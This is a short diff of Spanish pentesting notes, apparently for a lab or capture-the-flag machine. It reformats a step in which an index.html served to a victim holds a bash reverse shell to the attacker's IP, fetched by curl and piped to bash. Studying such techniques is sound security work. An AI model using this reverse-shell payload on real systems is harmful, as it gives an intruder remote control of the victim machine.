@@ -52,9 +52,13 @@ Este comando siempre se ejecuta en la maquina victima para hacer una ReverShell 
 
 ****
 Hacemos un archivo index.html y al momento de recibir la peticion **Curl** de la maquina victima podremos ejecutar la revershell y este debe ser interpretado por bash
-❯ **nano index.html**
-	**#!/bin/bash**
-	**bash -i >& /dev/tcp/10.10.14.2/443 0>&1**
+```bash
+❯ nano index.html
+	#!/bin/bash
+	bash -i >& /dev/tcp/10.10.14.2/443 0>&1
+
+	# IP = Nuestra IP de atacante
+```
 
 
 ## XXE
